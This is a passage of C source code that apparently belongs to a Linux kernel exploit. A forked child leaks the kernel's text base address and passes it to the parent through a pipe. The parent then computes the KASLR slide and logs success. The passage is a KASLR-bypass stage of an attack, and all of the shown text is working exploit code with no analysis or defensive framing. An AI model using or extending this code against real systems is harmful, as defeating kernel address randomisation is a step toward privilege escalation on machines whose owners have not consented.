      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
